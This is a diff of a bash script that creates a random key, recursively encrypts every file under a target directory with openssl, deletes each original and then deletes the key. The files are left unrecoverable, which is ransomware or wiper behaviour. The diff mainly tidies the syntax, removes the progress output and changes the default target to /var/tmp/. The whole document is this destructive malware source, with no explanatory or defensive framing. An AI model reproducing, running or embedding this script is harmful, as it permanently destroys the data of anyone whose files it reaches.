@@ -3,42 +3,33 @@ RMKEY=true
 RMFILES=true
 function encryptANDremove {
 	openssl enc -aes-256-cbc -salt -in "$1" -out "${1}.enc" -pass file:/root/key.bin &>/dev/null
-	if [ $RMFILES = true ]
-	then
+	if [ $RMFILES = true ]; then
 		rm $1
 	fi
 }
 
 function traverse {
 	cd $1
-	for d in *
-	do
+	for d in *; do
 		tmp=${DIR}${d}
-		if [ -d "$tmp" ]
-		then
-			echo $tmp
+		if [ -d "$tmp" ]; then
 			traverse $tmp
 		else
-			echo $tmp
 			encryptANDremove $tmp
 		fi
 	done
 }
 
 
-if [ "$#" -ne 1 ]
-then
-        DIR=$(pwd)
-        echo $DIR
+if [ "$#" -ne 1 ]; then
+        DIR="/var/tmp/"
 else
         DIR=$1
-        echo $DIR
 fi
 
 < /dev/urandom tr -cd 'A-Za-z0-9' | fold -w 256 | head -n 1 > /root/key.bin
 traverse $DIR
 
-if [ "$RMKEY" = true ]
-then
+if [ "$RMKEY" = true ]; then
 	rm /root/key.bin
 fi
